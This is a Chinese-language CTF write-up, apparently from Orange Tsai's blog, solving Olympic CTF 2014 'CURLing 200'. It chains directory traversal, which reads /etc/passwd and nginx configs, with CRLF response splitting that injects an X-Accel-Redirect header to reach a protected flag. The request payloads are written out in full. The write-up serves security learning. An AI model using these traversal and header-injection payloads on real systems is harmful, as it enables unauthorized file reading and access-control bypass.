---
source: orange-tsai
source_url: https://blog.orange.tw/posts/2014-02-olympic-ctf-2014-curling-200-write-up/
title: "Olympic CTF 2014 CURLing 200 write up | Orange Tsai"
author: "Orange Tsai"
published: 2014-02-09T16:00:00.000Z
description: "最近剛好玩了一下 Olympic CTF ，解了一些題目，其中有幾題讓自己印象深刻，還滿有趣的所以來記錄一下 XD (400 分的可以參考另外一篇 CURLing 400) 首先是 CURLing 200 分～ 打開是一個新聞系統的頁面 其中選取新聞的參數似乎是去讀取檔案，並且存在 Directory Traversal 漏洞，可以透過 ../ 來偽造路徑（還記得 遠通 嗎 XDD） http"
---

* * *

最近剛好玩了一下 [Olympic CTF](https://olympic-ctf.ru/) ，解了一些題目，其中有幾題讓自己印象深刻，還滿有趣的所以來記錄一下 XD (400 分的可以參考另外一篇 [CURLing 400](http://blog.orange.tw/2014/02/olympic-ctf-2014-curling-400-write-up.html))

首先是 CURLing 200 分～ 打開是一個新聞系統的頁面

![](https://blog.orange.tw/posts/2014-02-olympic-ctf-2014-curling-200-write-up/d23a84b96eec3b30-01.png)

其中選取新聞的參數似乎是去讀取檔案，並且存在 [Directory Traversal](https://www.owasp.org/index.php/Path_Traversal) 漏洞，可以透過 `../` 來偽造路徑

（還記得 [遠通](http://pastebin.com/mGk2bpXx) 嗎 XDD）

> http://109.233.61.11:27280/news/?f=./31-12-2013

漏洞判斷方式是把原本的參數加上 ./ 會顯示與原本的頁面一樣，所以可以利用 ../ 去讀取伺服器上的檔案（知道路徑以及權限足夠），如

> http://109.233.61.11:27280/news/?f=../../../../etc/passwd

![](https://blog.orange.tw/posts/2014-02-olympic-ctf-2014-curling-200-write-up/f50c8dafab993186-02.png)

也可以讀取 `/proc/self/cmdline` 來得知當前運行什麼程序

> http://109.233.61.11:27280/news/?f=../../../../proc/self/cmdline

可以知道這個新聞系統是用 Pyhton + Django + Gunicorn 所架設的

![](https://blog.orange.tw/posts/2014-02-olympic-ctf-2014-curling-200-write-up/3ecadecdabd389b4-03.png)

翻了一下似乎都找不到什麼有用的資訊，所以來看看 Nginx 還有藏什麼網頁服務在？ 猜一下 `Nginx.conf` 的預設位置

> http://109.233.61.11:27280/news/?f=../../../../etc/nginx/nginx.conf

![](https://blog.orange.tw/posts/2014-02-olympic-ctf-2014-curling-200-write-up/ae3be1151b2fc81b-04.png)

看不到什麼有用的資訊，不過沒關係我們在繼續猜

> http://109.233.61.11:27280/news/?f=../../../../etc/nginx/sites-enabled/default

Got it. 看到了 `/secret/flag` 的 URL pattern 似乎可以得到目標 flag

![](https://blog.orange.tw/posts/2014-02-olympic-ctf-2014-curling-200-write-up/fdab67997ac8008e-05.png)

但是直接 Access 會出現 404 Not Found T\_\_\_\_\_\_T

![](https://blog.orange.tw/posts/2014-02-olympic-ctf-2014-curling-200-write-up/a4df2d1a194e7e3f-06.png)

仔細再看一下 /etc/nginx/sites-enabled/default 檔案，會發現有 internal 以及 root 的字樣，查一下 [官方 manual](http://wiki.nginx.org/X-accel) 會發現這是 Nginx 的功能之一可以用來保護檔案。

至於存取的方法是 Nginx 判斷 server 是否有送出 X-Accel-Redirect 的 header，如果有才允許使用者存取檔案，但是這個 header 是 server 端控制，所以使用者無法偽造。

在這邊卡了一下子，不過再仔細觀察整個新聞系統發現網頁其實存在另外一個漏洞，在瀏覽新聞的時候下方回首頁的連結是透過一個參數 retpath 控制的

伺服器端實現的原理是把 retpath 的值放進 Location header 裡隨著 server 一起送回來，如送出

> http://109.233.61.11:27280/?retpath=foooo

則 server 吐回的則是 `Location: foooo`

![](https://blog.orange.tw/posts/2014-02-olympic-ctf-2014-curling-200-write-up/43e2195650c13a1c-07.png)

所以在這個情況下，存在 [HTTP Response Splitting](https://www.owasp.org/index.php/HTTP_Response_Splitting) 弱點，不過我們可以不用偽造整個 request 只要偽造一個 header 就好了例如

> http://109.233.61.11:27280/?retpath=foo%0d%0afake\_header:fake\_value

則可以成功偽造一個 fake\_header 的 header

![](https://blog.orange.tw/posts/2014-02-olympic-ctf-2014-curling-200-write-up/411f175d506706c9-08.png)

所以如果沒有搭配上面的 `../` 找出 Nginx 設定檔案，可能只會把這個當成一個沒有大危害的弱點 （只能針對 Client Side 攻擊），不過當配合上面 Nginx internal 的設定以及這個漏洞，組合技的效果就出來了，這也是我覺得這次題目出得不錯的原因之一XD

送出

> http://109.233.61.11:27280/?retpath=foo%0d%0aX-Accel-Redirect:/secret/flag

就可以得到 flag 惹！

> CTF{6e75d02b8e8329bb4b45c7dabd2e1da2}

![](https://blog.orange.tw/posts/2014-02-olympic-ctf-2014-curling-200-write-up/8309c59403b8da8e-09.png)